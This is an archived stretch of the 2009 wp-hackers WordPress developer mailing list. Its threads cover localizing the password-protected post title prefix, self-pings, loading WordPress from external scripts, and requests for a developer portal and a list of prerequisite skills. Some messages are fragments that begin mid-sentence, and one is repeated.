	<349fe48b0907310437q319ad18fld814a742bce1a8bd@mail.gmail.com>
Message-ID: <1249046983.4710.2.camel@rillian.narnia.sunriseroad.net>

On Fri, 2009-07-31 at 11:37 +0000, scribu wrote:
> You could just write
> 
> return str_replace(__('Protected:'), '', $format);
> 
> to account for l10n.

Won't work. For starters, __('Protected:') won't get translated, as it's
not the same as __('Protected: %s'), which is the original.

If a new language that decides the translate string is something like
__('Goo goo %s ga ga') (sorry, I don't speak anything other than
English, so every other language sounds like googaa to me), then how is
that going to work?


From wp-hackers at itsananderson.com  Fri Jul 31 13:36:25 2009
From: wp-hackers at itsananderson.com (Will Anderson)
Date: Fri, 31 Jul 2009 09:36:25 -0400
Subject: [wp-hackers] Hooks, Actions, Filters
In-Reply-To: <1249046983.4710.2.camel@rillian.narnia.sunriseroad.net>
References: <aa12c8990907282338y168194far850e3c5b60c2a34c@mail.gmail.com>
	<1248915286.9476.0.camel@rillian.narnia.sunriseroad.net>
	<aa12c8990907292250h4db8aed5wb08511d26f8284c9@mail.gmail.com>
	<aa12c8990907292250v63b36feap3d032dc94604e56c@mail.gmail.com>
	<e1202cb10907300804q7740c949g84a318f30a4ed30c@mail.gmail.com>
	<6dbcd2670907300916p776a0ecat4230a19be45289cc@mail.gmail.com>
	<349fe48b0907310437q319ad18fld814a742bce1a8bd@mail.gmail.com>
	<1249046983.4710.2.camel@rillian.narnia.sunriseroad.net>
Message-ID: <6dbcd2670907310636k6e30c5ax189926594af49aa@mail.gmail.com>

On Fri, Jul 31, 2009 at 9:29 AM, Jeremy Visser <jeremy at visser.name> wrote:

> On Fri, 2009-07-31 at 11:37 +0000, scribu wrote:
> > You could just write
> >
> > return str_replace(__('Protected:'), '', $format);
> >
> > to account for l10n.
>
> Won't work. For starters, __('Protected:') won't get translated, as it's
> not the same as __('Protected: %s'), which is the original.
>
> If a new language that decides the translate string is something like
> __('Goo goo %s ga ga') (sorry, I don't speak anything other than
> English, so every other language sounds like googaa to me), then how is
> that going to work?
>

According to the Codex page on
I18n<http://codex.wordpress.org/I18n_for_WordPress_Developers>it
sounds like even translating __('Protected: %s') in a plugin won't
work,
because of the way the localization tool works. Those translations are tied
directly to a specific line in a specific file. So yeah, another solution is
probably needed.

-- 
Will Anderson
http://www.itsananderson.com/

From wordpress at santosj.name  Fri Jul 31 19:06:30 2009
From: wordpress at santosj.name (Jacob Santos)
Date: Fri, 31 Jul 2009 14:06:30 -0500
Subject: [wp-hackers] Hooks, Actions, Filters
Message-ID: <4A7340B6.7080905@santosj.name>

I was waiting for someone to suggest just doing:

return '%s';


Jacob Santos

From bogus@does.not.exist.com  Wed Jul 15 02:15:36 2009
From: bogus@does.not.exist.com ()
Date: Wed, 15 Jul 2009 02:15:36 -0000
Subject: No subject
Message-ID: <mailman.9.1251582096.16652.wp-hackers@lists.automattic.com>

work?


On Sat, Aug 29, 2009 at 2:54 PM, Peter Westwood
<peter.westwood at ftwr.co.uk>wrote:

> It sounds like you are suffering from oases which prevent the self pings
> from working.
>
> This is normally due to hosting confug in relation to connections back to
> your server from your server.
>
> Does the built in cron system work for you? For example does future
> publishing posts work?
>
> --
> Peter Westwood
> http://peter.westwood.name
>
>
> On 29 Aug 2009, at 18:47, Chris Kasten <handy.solo at gmail.com> wrote:
>
>  Yes thanks. I realize a lot of people don't like them.  That's why that =
No
>> Pings plugin was invented! But I do like 'em and WP used to generate the=
m.
>> Like or dislike, I just wish to confirm that they (self pings) are indee=
d
>> dropped by WP now. If so, A nudge on how to re-enable them with a plugin
>> would be really groovy.
>>
>>
>> Chris Kasten
>> Solo Technology
>>
>>
>> On Sat, Aug 29, 2009 at 11:19 AM, Rics <ricardo.cezar at gmail.com> wrote:
>>
>>  Personally, I don't like self trackbacks... it's anoying.
>>> I prefer to have related posts and use trackback only from other
>>> websites.
>>> ---
>>> Rics
>>> http://www.pensarics.com
>>> http://www.meadiciona.com/rics
>>> Maring=E1, PR - Brasil
>>>
>>>
>>> 2009/8/29 scribu <scribu at gmail.com>
>>>
>>>  That's ironic, since there's a plugin that does the opposite. It's
>>>> called
>>>> No
>>>> Self Pings.
>>>>
>>>> --
>>>> http://scribu.net
>>>> _______________________________________________
>>>> wp-hackers mailing list
>>>> wp-hackers at lists.automattic.com
>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>>
>>>>  _______________________________________________
>>> wp-hackers mailing list
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>
>>>  _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From bogus@does.not.exist.com  Wed Jul 15 02:15:36 2009
From: bogus@does.not.exist.com ()
Date: Wed, 15 Jul 2009 02:15:36 -0000
Subject: No subject
Message-ID: <mailman.12.1257279904.16652.wp-hackers@lists.automattic.com>

the wp-blog-header.php file. You can include wp-load.php, and it'll be
slightly faster, but not all the query stuff will get initialized
because wp() won't get called.

-Otto

From bogus@does.not.exist.com  Wed Jul 15 02:15:36 2009
From: bogus@does.not.exist.com ()
Date: Wed, 15 Jul 2009 02:15:36 -0000
Subject: No subject
Message-ID: <mailman.16.1259630941.16652.wp-hackers@lists.automattic.com>

someone creates a new blog.

From bogus@does.not.exist.com  Wed Jul 15 02:15:36 2009
From: bogus@does.not.exist.com ()
Date: Wed, 15 Jul 2009 02:15:36 -0000
Subject: No subject
Message-ID: <mailman.17.1260564589.16652.wp-hackers@lists.automattic.com>

I learned mostly by looking at the code for other high-profile plugins and
core. But it'd be great to have a portal that combines all of the following:

   - Up-to-date walkthroughs/tutorials all in one place (Codex has links to
   various blog posts -- many are outdated)
   - Sample code (scattered around on the Codex)
   - Coding conventions (On the Codex)
   - Downloadable plugin skeletons
   - A complete/updated list of action/filter hooks with docs and links to
   source in trac (http://adambrown.info/p/wp_hooks)
   - PHPXref (http://xref.yoast.com/)
   - A search engine like http://wplookup.com/
   - A place where I can ask questions after I've spent 5 hours on a problem
   and still can't figure out, only to realize that I forgot a semi-colon and
   proceeding to *facepalm* (wp-hackers)

--
Mohammad Jangda
www.digitalize.ca | @mjangda

From bogus@does.not.exist.com  Wed Jul 15 02:15:36 2009
From: bogus@does.not.exist.com ()
Date: Wed, 15 Jul 2009 02:15:36 -0000
Subject: No subject
Message-ID: <mailman.18.1260564740.16652.wp-hackers@lists.automattic.com>

I learned mostly by looking at the code for other high-profile plugins and
core. But it'd be great to have a portal that combines all of the following:

   - Up-to-date walkthroughs/tutorials all in one place (Codex has links to
   various blog posts -- many are outdated)
   - Sample code (scattered around on the Codex)
   - Coding conventions (On the Codex)
   - Downloadable plugin skeletons
   - A complete/updated list of action/filter hooks with docs and links to
   source in trac (http://adambrown.info/p/wp_hooks)
   - PHPXref (http://xref.yoast.com/)
   - A search engine like http://wplookup.com/
   - A place where I can ask questions after I've spent 5 hours on a problem
   and still can't figure out, only to realize that I forgot a semi-colon
and
   proceeding to *facepalm* (wp-hackers)

--
Mohammad Jangda
www.digitalize.ca | @mjangda
_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers



From bogus@does.not.exist.com  Wed Jul 15 02:15:36 2009
From: bogus@does.not.exist.com ()
Date: Wed, 15 Jul 2009 02:15:36 -0000
Subject: No subject
Message-ID: <mailman.19.1260566516.16652.wp-hackers@lists.automattic.com>

where to look for examples on the Developer portal related to the various
sections of the framework.

- Brian Layman


From bogus@does.not.exist.com  Wed Jul 15 02:15:36 2009
From: bogus@does.not.exist.com ()
Date: Wed, 15 Jul 2009 02:15:36 -0000
Subject: No subject
Message-ID: <mailman.20.1261117791.16652.wp-hackers@lists.automattic.com>

,
on Godaddy, and locally hosted, on my laptop, the thing I would still find
most useful to this day is a list of prerequisites I should master before
tackling any particular tasks.  The ultimate task would be to call myself
aWordPress Developer so that the master list of prerequisites leads to,
well, mastery.



I would suggest that this master list of prerequisites assume only that the
user knows how to use a computer.  I'm not asking for tutorials on
everything from HTML to complete mastery, there is plenty of that stuff out
there already.  I'm just asking for a complete list of prerequisites.  I
would ask that you compile this list with the following audience in mind:



A 14-year-old high school freshman who has had his/her hands on computers
practically since birth.  This high school freshman is comfortable with a
keyboard and mouse, is familiar with many software applications and learns
them intuitively, navigating the internet is second nature but programming
is not,(yet.)  This freshman has just discovered WordPress and decides she
wants to be a WordPress Developer when she grows up.  He/she wants to
someday be able to not only build entire websites from the ground up but to
also be able to contribute to the core development of WordPress and maybe
even other open source projects.



What are the skills this potential future WordPress developer can begin to
develop?  (I=92m not a 14-year-old high school student, I just believe that
targeting the list of prerequisites towards a computer
savvy 14-year-old budding future WordPress developer is more likely to
inspiring a complete list of prerequisite skills than asking you to target
the list to people who are already skilled developers.)



WHERE TO BEGIN

WORDPRESS.COM - What is it and what are the skills that can be learned
there?

BLOGGING, CONTENT MANAGEMENT, PLUGINS, WIDGETS, ETC



What skills and level of mastery is necessary for what tasks?

SELF HOSTED WORDPRESS

WORDPRESS.ORG

WHAT IS SELF HOSTING - the knowledge and skills one needs to master to self
host.



WORDPRESS AS BLOGGING PLATFORM -



WORDPRESS AS CMS -HTML, XHTML, CSS, PHP, MYSQL,

Here it would be nice to know what skills does one need to acquire BEFORE
running to the WP community to ask a question such as "how do I get my post=
s
to sort alphabetically by category?" or, "how do I change the colors in my
theme?" etc.



What are the concepts necessary to understand prior to customizing a theme?

What are the skills necessary to master before I attempt to build plugins?

What level of understanding should I have about what concepts before I
attempt to submit bug report?



A skill set that might be a prerequisite of participating in the community
is OPEN SOURCE ETIQUETTE.  There should be a course.

Give back to the community

Be respectful

Do some research before participating in discussions or asking questions.

Be sure you have achieved mastery of the prerequisites for the related
topics or tasks before asking questions or trying to participate. (This
assumes that prerequisites are clearly spelled out somewhere.)



(This is not meant to be a complete list, just a place to start.)



All I'm asking is for a list of skills necessary to move up to the next
level, whatever that next level happens to be, customizing themes, building
plugins, contributing patches, etc.



Here I=92d just like to add that I am a big fan of the entire WP community.
Thank you all so much!  There is already a great deal of information out
there.  For a developer portal I don=92t see any reason to repeat all the
information that=92s already out there, just tell me what skills I need to
master and maybe point me in the right direction.  Anything above and beyon=
d
that is just awesomeness on the part of the community.

Nice to meet you all,

Rhonda

--=20
http://everything-south-padre-island.com

